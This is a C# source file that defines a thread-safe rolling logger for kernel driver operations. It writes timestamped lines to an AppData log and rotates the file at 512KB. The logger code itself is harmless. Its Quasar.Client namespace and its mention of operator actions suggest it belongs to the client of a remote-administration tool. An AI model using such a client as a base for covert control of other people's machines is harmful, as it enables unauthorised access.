using Quasar.Client.Config;
using System;
using System.IO;

namespace Quasar.Client.Logging
{
    /// <summary>
    /// Lightweight rolling logger dedicated to kernel driver operations.
    /// </summary>
    internal sealed class KernelDriverLogger
    {
        private const long MaxFileSizeBytes = 512 * 1024; // 512KB before rotating.
        private readonly string _logFile;
        private readonly object _syncRoot = new object();

        public KernelDriverLogger()
        {
            var baseDirectory = Settings.LOGSPATH;
            if (string.IsNullOrWhiteSpace(baseDirectory))
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                baseDirectory = Path.Combine(appData, "Quasar", "Logs");
            }

            Directory.CreateDirectory(baseDirectory);
            _logFile = Path.Combine(baseDirectory, "kernel-driver.log");
        }

        public void Info(string message) => Write("INFO", message);

        public void Warning(string message) => Write("WARN", message);

        public void Error(string message) => Write("ERROR", message);

        private void Write(string level, string message)
        {
            if (string.IsNullOrWhiteSpace(message))
                return;

            lock (_syncRoot)
            {
                RotateIfNeeded();
                try
                {
                    File.AppendAllText(_logFile,
                        $"{DateTime.UtcNow:O} [{level}] {message}{Environment.NewLine}");
                }
                catch
                {
                    // Logging failures should never disrupt operator actions.
                }
            }
        }

        private void RotateIfNeeded()
        {
            try
            {
                if (!File.Exists(_logFile))
                    return;

                var info = new FileInfo(_logFile);
                if (info.Length < MaxFileSizeBytes)
                    return;

                string archivePath = Path.ChangeExtension(_logFile, ".bak");
                if (File.Exists(archivePath))
                    File.Delete(archivePath);

                File.Move(_logFile, archivePath);
            }
            catch
            {
                // Rotation is best-effort.
            }
        }
    }
}
